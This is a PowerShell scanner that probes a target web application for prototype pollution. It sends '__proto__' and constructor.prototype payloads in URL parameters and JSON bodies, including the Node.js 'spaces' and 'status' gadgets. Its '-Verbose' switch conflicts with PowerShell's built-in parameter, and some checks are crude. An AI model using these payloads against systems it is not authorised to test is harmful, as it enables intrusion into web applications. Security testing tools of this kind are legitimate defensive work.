# Titan Prototype Pollution Detection Tool
# Usage: .\pp-detect.ps1 -Target "https://example.com"

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    
    [switch]$ServerSide,
    [switch]$ClientSide,
    [switch]$Verbose
)

Write-Host "=== Titan PP Detection Module ===" -ForegroundColor Cyan
Write-Host "Target: $Target" -ForegroundColor Yellow

# Client-side PP detection
function Test-ClientSidePP {
    param([string]$Url)
    
    Write-Host "`n[Client-Side PP Detection]" -ForegroundColor Green
    
    $testProps = @(
        "__proto__[titan_test]=polluted",
        "__proto__.titan_test=polluted",
        "constructor[prototype][titan_test]=polluted",
        "constructor.prototype.titan_test=polluted"
    )
    
    foreach ($prop in $testProps) {
        $testUrl = "$Url`?$prop"
        Write-Host "  Testing: $testUrl" -ForegroundColor Gray
        
        try {
            $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
            if ($response.Content -match "titan_test" -or $response.Content -match "polluted") {
                Write-Host "    [!] REFLECTED - Potential PP vector!" -ForegroundColor Red
                return $true
            }
        } catch {
            if ($Verbose) {
                Write-Host "    Error: $_" -ForegroundColor DarkGray
            }
        }
    }
    
    Write-Host "  [-] No client-side PP vectors found via URL parameters" -ForegroundColor DarkGray
    return $false
}

# Server-side PP detection (Node.js)
function Test-ServerSidePP {
    param([string]$Url)
    
    Write-Host "`n[Server-Side PP Detection]" -ForegroundColor Green
    
    # Test 1: JSON spaces gadget
    Write-Host "  Testing JSON spaces gadget..." -ForegroundColor Gray
    try {
        $body = '{"__proto__":{"spaces":2}}'
        $response = Invoke-WebRequest -Uri $Url -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        
        # Check if response is pretty-printed
        if ($response.Content -match "  ") {
            Write-Host "    [!] JSON spaces gadget may work!" -ForegroundColor Red
        }
    } catch {
        if ($Verbose) {
            Write-Host "    Error: $_" -ForegroundColor DarkGray
        }
    }
    
    # Test 2: Status code gadget
    Write-Host "  Testing status code gadget..." -ForegroundColor Gray
    try {
        $body = '{"__proto__":{"status":555}}'
        $response = Invoke-WebRequest -Uri $Url -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        
        if ($response.StatusCode -eq 555) {
            Write-Host "    [!] Status code gadget works! Response code: $($response.StatusCode)" -ForegroundColor Red
            return $true
        }
    } catch {
        if ($Verbose) {
            Write-Host "    Error: $_" -ForegroundColor DarkGray
        }
    }
    
    # Test 3: Constructor prototype
    Write-Host "  Testing constructor prototype pollution..." -ForegroundColor Gray
    try {
        $body = '{"constructor":{"prototype":{"titan_test":"polluted"}}}'
        $response = Invoke-WebRequest -Uri $Url -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        
        if ($response.Content -match "titan_test") {
            Write-Host "    [!] Constructor prototype pollution possible!" -ForegroundColor Red
            return $true
        }
    } catch {
        if ($Verbose) {
            Write-Host "    Error: $_" -ForegroundColor DarkGray
        }
    }
    
    Write-Host "  [-] No server-side PP vectors found" -ForegroundColor DarkGray
    return $false
}

# Main execution
$results = @{
    Target = $Target
    ClientSidePP = $false
    ServerSidePP = $false
    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

if ($ClientSide -or (-not $ServerSide)) {
    $results.ClientSidePP = Test-ClientSidePP -Url $Target
}

if ($ServerSide -or (-not $ClientSide)) {
    $results.ServerSidePP = Test-ServerSidePP -Url $Target
}

# Summary
Write-Host "`n=== Results ===" -ForegroundColor Cyan
Write-Host "Client-Side PP: $($results.ClientSidePP)" -ForegroundColor $(if ($results.ClientSidePP) { "Red" } else { "Green" })
Write-Host "Server-Side PP: $($results.ServerSidePP)" -ForegroundColor $(if ($results.ServerSidePP) { "Red" } else { "Green" })

# Return results
return $results
